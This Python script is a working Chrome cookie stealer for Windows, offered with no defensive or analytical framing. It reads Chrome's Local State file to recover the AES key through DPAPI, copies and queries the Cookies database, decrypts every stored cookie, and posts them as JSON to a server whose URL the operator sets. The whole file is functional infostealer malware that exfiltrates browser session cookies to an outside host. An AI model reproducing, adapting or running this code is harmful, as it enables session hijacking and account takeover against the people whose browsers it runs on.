from Crypto.Cipher import AES
import win32crypt
import requests
import sqlite3
import base64
import json
import os
import shutil

url = ""  # set url of your web server

# cookie paths: currently chrome only
chromePath = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
localStatePath = os.path.join(chromePath, 'Local State')
cookiesPath = os.path.join(chromePath, 'Default', 'Network', 'Cookies')
tempCookiesPath = os.path.join(os.environ["TEMP"], "tempcookies.db")

def getEncryptionKey():
    # retrieve chrome AES key for decrypting cookies
    try:
        with open(localStatePath, 'r', encoding='utf-8') as file:
            localStateData = json.load(file)
            encryptedKey = localStateData['os_crypt']['encrypted_key']
            keyData = base64.b64decode(encryptedKey)[5:]  # Remove "DPAPI" prefix
            return win32crypt.CryptUnprotectData(keyData, None, None, None, 0)[1]
    except Exception as e:
        print(f"Error retrieving encryption key: {e}")
        return None

def decrypt_cookie(encrypted_value, key):
    # decrypt a single cookie
    try:
        nonce = encrypted_value[3:15]
        cipher = AES.new(key, AES.MODE_GCM, nonce)
        decrypted_value = cipher.decrypt_and_verify(encrypted_value[15:-16], encrypted_value[-16:])
        return decrypted_value.decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"Decryption error: {e}")
        return None

def get_cookies():
    # copy and read the cookies database, then decrypt the cookies
    key = getEncryptionKey()
    if not key:
        print("Failed to retrieve encryption key.")
        return []

    # copy cookies database to a temporary location
    shutil.copy2(cookiesPath, tempCookiesPath)

    cookies = []
    try:
        conn = sqlite3.connect(tempCookiesPath)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies")

        for host_key, name, value, encrypted_value in cursor.fetchall():
            if not value:
                value = decrypt_cookie(encrypted_value, key)
            if value:
                cookies.append({
                    "name": name,
                    "value": value,
                    "domain": host_key,
                })
    except sqlite3.OperationalError as e:
        print(f"SQLite error: {e}")
    finally:
        conn.close()
        os.remove(tempCookiesPath)  # cleanup temporary file

    return cookies

def main():
    requests.post(url, json=get_cookies())

if __name__ == '__main__':
    main()
